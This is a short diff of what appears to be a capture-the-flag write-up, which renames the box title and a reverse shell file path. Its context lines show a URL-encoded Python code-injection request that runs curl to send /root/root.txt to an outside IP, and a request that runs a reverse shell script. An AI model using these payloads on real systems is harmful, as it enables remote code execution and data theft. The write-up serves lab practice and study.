@@ -1,4 +1,4 @@
-# Sau
+# PC
 
 ## Information about the box
 
@@ -305,7 +305,7 @@ jk=pyimport%20os;os.system("curl+-d+\"$(cat+/root/root.txt)\"+http%3a//10.10.16.
 
 But I didn't feel satisfied, I NEED TO POP A SHELL!
 
-The next thing I've done is create a reverse shell python file inside `/tmp/nora/revshell.py` using the `sau` account and sent the following request to the server:
+The next thing I've done is create a reverse shell python file inside `/tmp/nora/rev.py` using the `sau` account and sent the following request to the server:
 
 ```
 jk=pyimport%20os;os.system("/tmp/nora/rev.py");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
